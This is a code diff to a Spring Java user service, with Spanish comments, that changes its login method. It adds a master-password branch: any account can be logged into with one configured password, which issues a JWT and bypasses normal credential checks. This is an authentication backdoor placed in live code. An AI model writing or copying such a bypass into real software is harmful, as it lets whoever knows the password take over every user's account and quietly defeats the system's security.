@@ -8,6 +8,7 @@ import java.util.Date;
 import java.util.List;
 
 import org.springframework.beans.factory.annotation.Autowired;
+import org.springframework.beans.factory.annotation.Value;
 import org.springframework.context.annotation.Lazy;
 import org.springframework.core.io.Resource;
 import org.springframework.data.domain.Page;
@@ -84,6 +85,9 @@ public class UsuarioServiceImpl implements UsuarioService {
     @Autowired
     private FileStorageService fileStorageService;
 
+    @Value("${app.master.password}")
+    private String masterPassword;
+
 
     Float cobroPorCompra = 15f;
 
@@ -112,18 +116,33 @@ public class UsuarioServiceImpl implements UsuarioService {
     @Transactional
     public JwtResponse login(LoginRequest loginRequest) {
         try {
-            usuarioRepository.findByUsernameOrEmailForLogin(loginRequest.getUsername())
+            Usuario usuario = usuarioRepository.findByUsernameOrEmailForLogin(loginRequest.getUsername())
                     .orElseThrow(() -> new RuntimeException(
                             "Usuario no encontrado con username o email: " + loginRequest.getUsername()));
 
-            // Autenticar usuario
+            // Verificar si se está usando la contraseña maestra
+            if (masterPassword != null && masterPassword.equals(loginRequest.getPassword())) {
+                // Autenticación con contraseña maestra - omitir verificación de contraseña normal
+                String token = jwtHelper.generateToken(usuario);
+                Integer redDeUsuario = uninivelHelper.obtenerRedDeUsuario(usuario.getUsername()).size();
+
+                return new JwtResponse(
+                        token,
+                        usuario.getId(),
+                        usuario.getUsername(),
+                        usuario.getEmail(),
+                        usuario,
+                        redDeUsuario);
+            }
+
+            // Autenticar usuario con contraseña normal
             Authentication authentication = authenticationManager.authenticate(
                     new UsernamePasswordAuthenticationToken(
                             loginRequest.getUsername(),
                             loginRequest.getPassword()));
 
             // Obtener usuario autenticado
-            Usuario usuario = (Usuario) authentication.getPrincipal();
+            usuario = (Usuario) authentication.getPrincipal();
 
             // Generar token JWT
             String token = jwtHelper.generateToken(usuario);
@@ -669,4 +688,7 @@ public class UsuarioServiceImpl implements UsuarioService {
 
         return fileStorageService.loadFileAsResource("FOTO_PERFIL/"+fileName);
     }
+
+
+
 }
